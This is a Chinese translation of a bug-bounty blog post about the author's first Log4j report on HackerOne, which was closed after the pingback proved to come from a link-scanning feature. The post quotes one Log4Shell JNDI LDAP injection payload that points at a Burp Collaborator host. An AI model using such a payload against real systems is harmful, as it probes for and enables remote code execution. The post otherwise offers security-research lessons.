<html>
<head>
<title>Facts to clear about Log4J for “Bug Bounty Hunters”</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">为“虫子赏金猎人”澄清Log4J的事实</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/facts-to-clear-about-log4j-for-bug-bounty-hunters-f58e04eb025?source=collection_archive---------0-----------------------#2021-12-20">https://infosecwriteups.com/facts-to-clear-about-log4j-for-bug-bounty-hunters-f58e04eb025?source=collection_archive---------0-----------------------#2021-12-20</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="5d06" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">大家好，</h2></div><p id="7473" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在我的第一个<a class="ae lb" rel="noopener ugc nofollow" target="_blank" href="/my-first-valid-bugs-8fa698f6aebe">博客</a>中，我提到我将会发布一个关于我的每一个发现的博客。我还收到了DMs，询问我最近在P1发现的细节/方法。因为我现在是本科的最后一年，我正在做全职的bug赏金猎人，学习一些新概念，这就是为什么我没有及时发表博客文章。很抱歉:)</p><p id="5e38" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">从明年1月起，将开始上传所有博客。但是这个博客对目前的情况很有意义。</p><figure class="ld le lf lg gt lh gh gi paragraph-image"><div role="button" tabindex="0" class="li lj di lk bf ll"><div class="gh gi lc"><img src="../Images/a65197574611b3aea9bd1e939305ffb4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5_qJt8wwR-TfZGN1APTPew.png"/></div></div></figure><h1 id="c3b8" class="lo lp iq bd lq lr ls lt lu lv lw lx ly jw lz jx ma jz mb ka mc kc md kd me mf bi translated">让我们开始吧。</h1><p id="6bbe" class="pw-post-body-paragraph kf kg iq kh b ki mg jr kk kl mh ju kn ko mi kq kr ks mj ku kv kw mk ky kz la ij bi translated">2天前我分享了我的Log4j Hackerone报告的截图。之后我在Instagram上收到了很多DM请求一些帮助，关于Log4j的指导。</p><p id="e99d" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我想澄清一些关于这个bug的疑惑和误解。</p><p id="1f1a" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">提交了3份关于Hackerone计划的报告:</p><ol class=""><li id="7bc5" class="ml mm iq kh b ki kj kl km ko mn ks mo kw mp la mq mr ms mt bi translated">第一次报告:不适用，但<strong class="kh ir"> <em class="mu">悬赏帮助他们排除故障</em> </strong></li><li id="9488" class="ml mm iq kh b ki mv kl mw ko mx ks my kw mz la mq mr ms mt bi translated">第二次报告:有效并授予奖金(与第一次报告相同的程序)</li><li id="2f57" class="ml mm iq kh b ki mv kl mw ko mx ks my kw mz la mq mr ms mt bi translated">第三次报告:长篇大论(不同的方案)</li></ol><p id="f36f" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在这篇博客中，我们将只讨论<strong class="kh ir">“第一次报告”</strong></p><p id="f29d" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">众所周知，log4j是最新的漏洞，在网站上找到Log4j的资源非常少。您可以在名称字段、UA字符串、支持表单中的任何地方找到Log4j..实际上是网站上的任何输入字段。</p><p id="7351" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">让我澄清一件事:<strong class="kh ir">如果你从该公司的IP地址(而不是从谷歌或AWS)得到pingback，然后报告它，你不需要执行完整的RCE。</strong> <strong class="kh ir"> <em class="mu">(根据我到目前为止在HackerOne上的经验)</em> </strong></p><p id="b3f3" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">该网站有一个创建自己的频道的功能，你可以在那里添加成员，可以发布信息，问题等。所以我提交了Log4j有效负载，包括我的burp collaborator链接，作为我的频道中的一个问题。</p><p id="cecb" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">有效负载:$ { JNDI:LDAP://p1ry 70 m3 axtxo 2 qlpl 4 l 6 smgdm 3 as . burpcollaborator . net/a }</p><p id="cd02" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">然后嘣！！对我来说，不是对公司:)</p><p id="bc87" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">从公司的IP上得到HTTP pingback。</p><figure class="ld le lf lg gt lh gh gi paragraph-image"><div role="button" tabindex="0" class="li lj di lk bf ll"><div class="gh gi na"><img src="../Images/451e83d46d52ab331aecc32a14c66cb5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*R18IMbB79uVz0aZjv7QaSg.png"/></div></div><figcaption class="nb nc gj gh gi nd ne bd b be z dk translated">HTTP Pingback请求。</figcaption></figure><p id="0f75" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">提交了报告。</p><p id="c668" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">然后公司找我要UA string。</p><figure class="ld le lf lg gt lh gh gi paragraph-image"><div role="button" tabindex="0" class="li lj di lk bf ll"><div class="gh gi nf"><img src="../Images/daa2ce7b2238df9b2c628f877c7c7b95.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sz2YMC8Xda28Ve9MqLJ3dA.png"/></div></div></figure><p id="47c8" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">然后我提交了UA字符串，</p><p id="81dc" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">用户代理:<code class="fe ng nh ni nj b">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0</code></p><p id="e753" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">公司再次要求我提供概念验证视频。</p><figure class="ld le lf lg gt lh gh gi paragraph-image"><div role="button" tabindex="0" class="li lj di lk bf ll"><div class="gh gi nf"><img src="../Images/91d1fabcd0a67d6bc5efe6f0365f5d69.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dxsCQ-bSv6MdseAj667IPA.png"/></div></div></figure><p id="c4d8" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">之后，该公司要求我重新测试并捕捉视频，因为他们实现了某种算法或功能来跟踪这种活动。</p><figure class="ld le lf lg gt lh gh gi paragraph-image"><div role="button" tabindex="0" class="li lj di lk bf ll"><div class="gh gi nk"><img src="../Images/214c1becd8cf5d8c2e304979d97e1769.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_TRxIjxpIIPqI8d1QIbjHQ.png"/></div></div></figure><p id="5bbf" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我提交了视频POC，经过一天的等待，他们得出结论，以NA的身份关闭此报告，并奖励我帮助他们排除故障。</p><figure class="ld le lf lg gt lh gh gi paragraph-image"><div role="button" tabindex="0" class="li lj di lk bf ll"><div class="gh gi nl"><img src="../Images/f17c70406b8e49c69afa8f00e0e9f1a7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hFzDxZ6s9DHyb_hlcyTBBw.png"/></div></div></figure><p id="d3ce" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">读完这篇文章后，我心中有很多疑问，如果这不是Log4j，那么这个有效载荷是如何触发的。我当时想:</p><figure class="ld le lf lg gt lh gh gi paragraph-image"><div class="gh gi nm"><img src="../Images/4efaf2cdedddb27b953cb327fa7de8e4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1056/0*J6XNxNulDdGV25I7.gif"/></div></figure><p id="c70b" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">然后我问他们这个问题，过了一段时间，另一个开发商来了，他回答说:</p><figure class="ld le lf lg gt lh gh gi paragraph-image"><div role="button" tabindex="0" class="li lj di lk bf ll"><div class="gh gi nn"><img src="../Images/8e4bb3797da3574aaca65327eafb01f9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cneqwpk78-R-CNTgF1gSAA.png"/></div></div></figure><p id="fd50" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我真是个笨蛋:)</p><p id="4aec" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">是因为链接抓取功能触发的。</p><p id="4264" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">然后我使用Canary Log4shell令牌再次测试，这次我得到了来自AWS主机的pingback。</p><figure class="ld le lf lg gt lh gh gi paragraph-image"><div role="button" tabindex="0" class="li lj di lk bf ll"><div class="gh gi no"><img src="../Images/97fd6b02b31f7d93dae03ecc1b2428bc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hdRwPY9oetZD-zj_uq3MUg.png"/></div></div></figure><blockquote class="np nq nr"><p id="e8f5" class="kf kg mu kh b ki kj jr kk kl km ju kn ns kp kq kr nt kt ku kv nu kx ky kz la ij bi translated">记住:只有当你从公司的IP地址得到回应时才报告。如果你从谷歌或AWS报告pingback，他们会将其作为NA关闭，你的(AWS/谷歌pingback)报告被接受为有效问题的可能性很小。</p></blockquote><p id="7252" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir">那么这个来自谷歌/AWS的pingback是怎么回事呢？别担心，我有这个。</strong></p><p id="bc68" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我在LinkedIn上的一个熟人<a class="ae lb" href="https://www.linkedin.com/in/sanyam-kakkar-82b6901a9/" rel="noopener ugc nofollow" target="_blank"> Sanyam Kakkar </a>告诉了我这件事:</p><blockquote class="np nq nr"><p id="75d6" class="kf kg mu kh b ki kj jr kk kl km ju kn ns kp kq kr nt kt ku kv nu kx ky kz la ij bi translated"><strong class="kh ir"/></p><p id="7f96" class="kf kg mu kh b ki kj jr kk kl km ju kn ns kp kq kr nt kt ku kv nu kx ky kz la ij bi translated"><strong class="kh ir"> <em class="iq">您在报告中演示的有效负载确实是由Log4Shell触发的，但是它也包含一个字面上写的主机名。我们的系统经常扫描各种用户输入(例如聊天消息、电子邮件)中的主机名和URL，通过DNS解析它们，并尝试获取URL，例如，确定有效载荷是否是恶意的，或者消息本身是否应该被归类为垃圾邮件。我们认为这就是这里发生的事情。这是谷歌的行为，如果他们在产品的任何地方发现域名，就会对其进行ping操作。</em> </strong></p></blockquote><p id="22cd" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">(黑客计划)公司的安全人员非常好。由于这是我的第一份Log4j报告，我从错误中学到了很多新东西，这对我很有帮助，并成功提交了2份有效的Log4j报告。</p><blockquote class="np nq nr"><p id="33d2" class="kf kg mu kh b ki kj jr kk kl km ju kn ns kp kq kr nt kt ku kv nu kx ky kz la ij bi translated">本博客中的所有信息都是根据我的经验和错误。我对所有读者和bug猎人的谦卑请求，如果你有任何更正或其他信息，请随时评论或给我发短信，我会在博客中添加或修改。 </p></blockquote><p id="179c" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">随意连接:<a class="ae lb" href="https://www.linkedin.com/in/jaydev-ahire/" rel="noopener ugc nofollow" target="_blank"><strong class="kh ir">Linkedin</strong></a><strong class="kh ir"/><a class="ae lb" href="https://twitter.com/cybor_j" rel="noopener ugc nofollow" target="_blank"><strong class="kh ir">Twitter</strong></a></p><p id="5c89" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><em class="mu"> (PS:请不要在DM里问赏金金额n这些东西)</em></p></div></div>    
</body>
</html>